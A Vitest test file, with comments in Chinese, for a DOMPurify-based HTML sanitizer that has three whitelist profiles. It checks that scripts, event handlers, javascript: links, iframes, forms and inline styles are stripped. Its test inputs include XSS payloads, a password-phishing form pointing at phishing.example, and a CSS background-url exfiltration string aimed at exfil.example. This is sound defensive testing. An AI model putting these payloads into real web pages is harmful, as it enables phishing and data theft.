import { describe, it, expect } from 'vitest'
import DOMPurify from 'dompurify'
import {
  sanitizeHtml,
  sanitizeTableCellHtml,
  sanitizeLegalHtml,
  sanitizeObject,
} from '@/utils/sanitize'
import legal from '@/ui/data/legal.json'

describe('sanitize.js - DOMPurify HTML 净化', () => {
  describe('sanitizeHtml', () => {
    it('空输入返回空字符串', () => {
      expect(sanitizeHtml('')).toBe('')
      expect(sanitizeHtml(null)).toBe('')
      expect(sanitizeHtml(undefined)).toBe('')
    })

    it('非字符串输入返回空字符串', () => {
      expect(sanitizeHtml(123)).toBe('')
      expect(sanitizeHtml({})).toBe('')
    })

    it('保留安全标签（h1, p, strong, em 等）', () => {
      const input = '<h1>标题</h1><p>段落<strong>加粗</strong><em>强调</em></p>'
      const result = sanitizeHtml(input)
      expect(result).toContain('<h1>标题</h1>')
      expect(result).toContain('<strong>加粗</strong>')
      expect(result).toContain('<em>强调</em>')
    })

    it('保留链接和图片标签', () => {
      const input = '<a href="https://example.com" target="_blank">链接</a>'
      const result = sanitizeHtml(input)
      expect(result).toContain('<a ')
      expect(result).toContain('href="https://example.com"')
      expect(result).toContain('target="_blank"')
    })

    it('移除 script 标签及其内容', () => {
      const input = '<div>正常内容</div><script>alert("XSS")</script>'
      const result = sanitizeHtml(input)
      expect(result).not.toContain('<script>')
      expect(result).not.toContain('alert("XSS")')
      expect(result).toContain('正常内容')
    })

    it('移除 on* 事件处理器属性', () => {
      const input = '<div onclick="alert(1)" onmouseover="bad()">内容</div>'
      const result = sanitizeHtml(input)
      expect(result).not.toContain('onclick')
      expect(result).not.toContain('onmouseover')
      expect(result).toContain('内容')
    })

    it('移除 javascript: 伪协议', () => {
      const input = '<a href="javascript:alert(1)">点击</a>'
      const result = sanitizeHtml(input)
      expect(result).not.toContain('javascript:')
    })

    it('移除 iframe 标签', () => {
      const input = '<div>内容</div><iframe src="https://evil.com"></iframe>'
      const result = sanitizeHtml(input)
      expect(result).not.toContain('<iframe')
      expect(result).toContain('内容')
    })

    it('保留列表标签（ul, ol, li）', () => {
      const input = '<ul><li>项目1</li><li>项目2</li></ul>'
      const result = sanitizeHtml(input)
      expect(result).toContain('<li>项目1</li>')
      expect(result).toContain('<li>项目2</li>')
    })

    it('保留表格标签', () => {
      const input = '<table><tr><th>标题</th></tr><tr><td>数据</td></tr></table>'
      const result = sanitizeHtml(input)
      expect(result).toContain('<th>标题</th>')
      expect(result).toContain('<td>数据</td>')
    })

    it('保留代码块标签', () => {
      const input = '<pre><code>const x = 1;</code></pre>'
      const result = sanitizeHtml(input)
      expect(result).toContain('<pre>')
      expect(result).toContain('<code>const x = 1;</code>')
    })

    it('移除 style 标签（保留 class 属性）', () => {
      const input = '<div class="my-class" style="color:red">内容</div>'
      const result = sanitizeHtml(input)
      expect(result).not.toContain('style=')
      expect(result).toContain('class="my-class"')
    })

    it('保留 SVG 图标标签与图形属性', () => {
      const input =
        '<svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor"><path d="M20 6 9 17l-5-5"/></svg>'
      const result = sanitizeHtml(input)
      expect(result).toContain('<svg')
      expect(result).toContain('viewBox="0 0 24 24"')
      expect(result).toContain('width="18"')
      expect(result).toContain('stroke="currentColor"')
      expect(result).toContain('<path d="M20 6 9 17l-5-5">')
    })

    it('SVG 内嵌 script 与事件属性被移除', () => {
      const input =
        '<svg viewBox="0 0 24 24" onload="alert(1)"><script>evil()</script><circle cx="12" cy="12" r="8" onclick="hack()"/></svg>'
      const result = sanitizeHtml(input)
      expect(result).not.toContain('onload')
      expect(result).not.toContain('<script>')
      expect(result).not.toContain('evil')
      expect(result).not.toContain('onclick')
      expect(result).toContain('<circle')
    })

    it('SVG title 文本中的注入内容被净化', () => {
      const input =
        '<svg viewBox="0 0 24 24"><title>数据</title><text x="10" y="10">正常</text></svg>'
      const result = sanitizeHtml(input)
      expect(result).toContain('<title>')
      expect(result).toContain('数据')
      expect(result).toContain('<text ')
    })

    it('净化 HTML 中的 SVG 标签', () => {
      const input = '<div>内容</div><svg><path d="M0 0"/></svg>'
      const result = sanitizeHtml(input)
      expect(result).toContain('<svg>')
      expect(result).toContain('<path d="M0 0">')
      expect(result).toContain('内容')
    })
  })

  describe('sanitizeObject', () => {
    it('原始值原样返回', () => {
      expect(sanitizeObject(42)).toBe(42)
      expect(sanitizeObject(true)).toBe(true)
      expect(sanitizeObject(null)).toBe(null)
    })

    it('字符串进行净化', () => {
      const result = sanitizeObject('<script>alert(1)</script>')
      expect(result).not.toContain('<script>')
    })

    it('数组递归净化', () => {
      const input = ['安全', '<script>xss</script>', '安全']
      const result = sanitizeObject(input)
      expect(result[0]).toBe('安全')
      expect(result[1]).not.toContain('<script>')
      expect(result[2]).toBe('安全')
    })

    it('对象递归净化', () => {
      const input = {
        name: '测试',
        description: '<b>安全</b><script>alert(1)</script>',
      }
      const result = sanitizeObject(input)
      expect(result.name).toBe('测试')
      expect(result.description).toContain('<b>安全</b>')
      expect(result.description).not.toContain('<script>')
    })

    it('嵌套对象深层净化', () => {
      const input = {
        article: {
          title: '标题',
          blocks: [{ text: '<p>安全</p><script>bad</script>' }, { text: '<strong>重要</strong>' }],
        },
      }
      const result = sanitizeObject(input)
      expect(result.article.blocks[0].text).toContain('<p>安全</p>')
      expect(result.article.blocks[0].text).not.toContain('<script>')
      expect(result.article.blocks[1].text).toContain('<strong>重要</strong>')
    })
  })
})

/**
 * F-1：三处 v-html 位点统一走本文件的档位。
 * 下面这组用例的重点不是"能不能挡住脚本"（宽 profile 本来就挡不住的东西不多），
 * 而是把**处置前后的差量**测出来：可信域钓鱼表单与 CSS 数据外带在改前是"保留"，改后必须"剥离"。
 * 样本是合成字符串，不含任何真实课件内容。
 */
describe('sanitize.ts · 三档白名单（v-html 唯一入口）', () => {
  /** 处置前 ReaderTab 的配置，原样搬来做对照，证明漏洞不是推理出来的 */
  const wideBefore = (html: string) => DOMPurify.sanitize(html, { USE_PROFILES: { html: true } })

  const POLLUTED = [
    '<p class="lead">正常正文</p>',
    '<form action="https://phishing.example/login">',
    '<input name="password" placeholder="请输入密码">',
    '</form>',
    '<div style="background:url(https://exfil.example/collect?d=secret)">外带</div>',
    '<script>alert(1)</script>',
    '<a href="javascript:alert(2)">点我</a>',
  ].join('')

  it('真污染样本 · 改前（宽 profile）确实留下了钓鱼表单与 CSS 外带', () => {
    const before = wideBefore(POLLUTED)
    // 脚本类本来就进不来——所以这条缺陷的严重性不在 XSS 而在钓鱼／外带，对照要照出这一点
    expect(before).not.toContain('<script')
    expect(before).not.toContain('javascript:')
    // 这两条是改前"保留"、改后"剥离"的差量本体
    expect(before).toContain('<form')
    expect(before).toContain('action="https://phishing.example/login"')
    expect(before).toContain('<input')
    expect(before).toContain('name="password"')
    expect(before).toContain('style="background:url(https://exfil.example/collect?d=secret)"')
  })

  it('真污染样本 · 改后（reader 档）四件构造全部剥离，正常正文不受损', () => {
    const after = sanitizeHtml(POLLUTED)
    expect(after).toContain('<p class="lead">正常正文</p>')
    expect(after).not.toContain('<form')
    expect(after).not.toContain('phishing.example')
    expect(after).not.toContain('<input')
    expect(after).not.toContain('name="password"')
    expect(after).not.toContain('<button')
    expect(after).not.toContain('style=')
    expect(after).not.toContain('exfil.example')
    expect(after).not.toContain('<script')
    expect(after).not.toContain('alert')
    expect(after).not.toContain('javascript:')
  })

  it('style 属性在三档里一律进不来（CSP style-src 的残留依赖据此可评估）', () => {
    const html = '<p style="color:red;background:url(https://exfil.example/x)">正文</p>'
    expect(sanitizeHtml(html)).not.toContain('style=')
    expect(sanitizeTableCellHtml(html)).not.toContain('style=')
    expect(sanitizeLegalHtml(html)).not.toContain('style=')
  })

  it('表格档：内联标签与 class 保留，链接／表单／style 剥离', () => {
    const cell =
      '<b>已发布</b><small class="muted">3 天前</small><time datetime="2026-10-01">10-01</time>'
    expect(sanitizeTableCellHtml(cell)).toContain('<b>已发布</b>')
    expect(sanitizeTableCellHtml(cell)).toContain('<small class="muted">3 天前</small>')
    expect(sanitizeTableCellHtml(cell)).toContain('<time')
    expect(sanitizeTableCellHtml('<a href="https://evil.example">下载</a>')).not.toContain('<a')
    expect(sanitizeTableCellHtml('<form action="/x"><input name="a"></form>')).not.toContain(
      '<form',
    )
  })

  it('法务档：section＋class 是这一档独有的承载，其余照旧剥离', () => {
    const html =
      '<section class="contact-section"><h2>联系我们</h2><p><em>邮箱</em>：a@b.c</p></section>'
    expect(sanitizeLegalHtml(html)).toBe(html)
    expect(
      sanitizeLegalHtml(
        '<img src="https://evil.example/x.png"><svg><script>alert(1)</script></svg>',
      ),
    ).not.toContain('<img')
    expect(sanitizeLegalHtml('<a href="https://example.com">链接</a>')).not.toContain('<a')
  })

  it('回归：legal.json 的正文在新档位下与处置前的本地配置逐字节相同（没被悄悄放大或缩小）', () => {
    const oldLocal = (html: string) =>
      DOMPurify.sanitize(html, {
        ALLOWED_TAGS: ['section', 'h2', 'p', 'strong', 'ul', 'li', 'br', 'span', 'em'],
        ALLOWED_ATTR: ['class'],
      })
    const oldTableLocal = (html: string) =>
      DOMPurify.sanitize(html, {
        ALLOWED_TAGS: ['b', 'small', 'span', 'i', 'strong', 'br', 'time'],
        ALLOWED_ATTR: ['class', 'style'],
      })
    for (const kind of ['agreement', 'privacy'] as const) {
      expect(sanitizeLegalHtml(legal[kind].html)).toBe(oldLocal(legal[kind].html))
    }
    for (const cell of [
      '<b>已发布</b>',
      '<small>草稿</small>',
      '<span class="chip">3</span>',
      '<time datetime="2026-10-01">10-01</time>',
      '<i>待批阅</i><br><strong>2 人</strong>',
    ]) {
      expect(sanitizeTableCellHtml(cell)).toBe(oldTableLocal(cell))
    }
  })

  it('边界：空串／null／非字符串一律归空串，三档同口径', () => {
    for (const fn of [sanitizeHtml, sanitizeTableCellHtml, sanitizeLegalHtml]) {
      expect(fn('')).toBe('')
      expect(fn(null)).toBe('')
      expect(fn(undefined)).toBe('')
      expect(fn(123)).toBe('')
      expect(fn({})).toBe('')
    }
  })

  it('恶意输入：事件属性与危险标签在 reader 档被剥离，展示类标签保留', () => {
    const html =
      '<div><h3>标题</h3><ul><li><a href="https://ok.example" target="_blank">正常链接</a></li></ul>' +
      '<img src="https://ok.example/a.png" onerror="alert(1)"><iframe src="https://evil.example"></iframe>' +
      '<object data="x"></object><embed src="y"><textarea name="t"></textarea></div>'
    const out = sanitizeHtml(html)
    expect(out).toContain('<h3>标题</h3>')
    expect(out).toContain('<a href="https://ok.example"')
    expect(out).toContain('target="_blank"')
    expect(out).toContain('<img src="https://ok.example/a.png"')
    for (const needle of ['onerror', '<iframe', '<object', '<embed', '<textarea', '<script']) {
      expect(out, needle).not.toContain(needle)
    }
  })
})
